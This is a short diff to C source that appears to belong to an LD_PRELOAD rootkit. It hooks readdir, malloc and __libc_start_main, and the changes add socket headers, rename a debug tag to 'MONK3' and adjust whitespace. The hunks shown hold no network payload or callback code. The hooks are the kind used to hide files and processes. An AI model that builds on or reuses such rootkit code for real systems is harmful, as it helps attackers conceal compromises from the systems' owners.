@@ -4,9 +4,12 @@
 #include <unistd.h>
 #include <dirent.h>
 #include <string.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
 #include "res/config.h"
 
-#define RK_INFO "\e[1;31m[\e[0mHOOK\e[1;31m]\e[0m --> "
+#define RK_INFO "\e[1;31m[\e[0mMONK3\e[1;31m]\e[0m --> "
 
 struct dirent *(*orig_readdir)(DIR *dir);
 struct dirent64 *(*orig_readdir64)(DIR *dir);
@@ -51,7 +54,7 @@ void *malloc(size_t size) {
 
 int main_hook(int argc, char **argv, char **envp) {
     int ret = orig_main(argc, argv, envp);
-    
+
     #ifdef DEBUG
         fprintf(stderr, RK_INFO"main() returned %d | ", ret);
 
@@ -63,6 +66,7 @@ int main_hook(int argc, char **argv, char **envp) {
 
     return ret;
 }
+
 
 int __libc_start_main(int (*main)(int, char **, char **), int argc, char **argv, int (*init)(int, char **, char **), void (*fini)(void), void (*rtld_fini)(void), void *stack_end) {
     orig_main = main;
